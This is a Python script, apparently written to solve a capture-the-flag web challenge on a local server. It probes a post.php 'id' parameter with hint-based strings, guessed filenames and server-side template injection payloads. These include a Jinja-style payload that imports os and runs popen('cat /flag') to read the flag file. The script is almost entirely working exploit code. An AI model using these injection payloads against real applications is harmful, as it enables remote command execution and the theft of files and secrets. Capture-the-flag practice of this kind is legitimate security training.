import requests
import re

base_url = "http://127.0.0.1:32891"

print("[+] Testing if ID parameter is used in template rendering...")

# Test with the exact hint text
test_ids = [
    "I'm_a_Script_Kiddie",
    "{I'm_a_Script_Kiddie}",
    "$I'm_a_Script_Kiddie",
    "${I'm_a_Script_Kiddie}",
]

for test_id in test_ids:
    resp = requests.get(f"{base_url}/post.php", params={'id': test_id})
    print(f"\nTesting ID: {test_id}")
    print(f"Length: {len(resp.text)}")
    
    # Check if the ID appears in response
    if test_id in resp.text:
        print(f"[!] ID reflected in response!")
        # Find context
        idx = resp.text.find(test_id)
        context = resp.text[max(0, idx-100):idx+100]
        print(f"Context: ...{context}...")
    
    if 'FLAG{' in resp.text:
        print("[!!!] FLAG FOUND!")
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        print(f"Flags: {flags}")
        print(resp.text)
        break

# What if the hint is telling us about a vulnerability in how names are processed?
# Try injecting into the title/name
print("\n\n[+] Testing template injection in various contexts...")

template_payloads = [
    "{{7*7}}",
    "${7*7}",
    "{{config}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}",
]

for payload in template_payloads:
    # Try as ID
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    if '49' in resp.text and '7*7' in payload:
        print(f"\n[!!!] SSTI DETECTED in id parameter!")
        print(f"Payload: {payload}")
        # Exploit it
        flag_payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"
        resp2 = requests.get(f"{base_url}/post.php", params={'id': flag_payload})
        if 'FLAG{' in resp2.text:
            print("[!!!] FLAG FOUND VIA SSTI!")
            print(resp2.text)

# Maybe it's simpler - what if there's a file literally named after the hint?
print("\n\n[+] Testing literal hint-based filenames...")
hint_files = [
    "I_m_a_Script_Kiddie",
    "Im_a_Script_Kiddie",
    "m_a_Script_Kiddie",
    "a_Script_Kiddie",
    "Script_Kiddie_v1",
    "Script_Kiddie_1",
]

for filename in hint_files:
    for prefix in ['', 'uploads/']:
        test_id = f"{prefix}{filename}"
        resp = requests.get(f"{base_url}/post.php", params={'id': test_id})
        if "Post not found" not in resp.text and len(resp.text) > 100:
            print(f"\n[!] Found: {test_id}")
            print(f"Length: {len(resp.text)}")
            if 'FLAG{' in resp.text:
                print("[!!!] FLAG FOUND!")
                print(resp.text)
                break

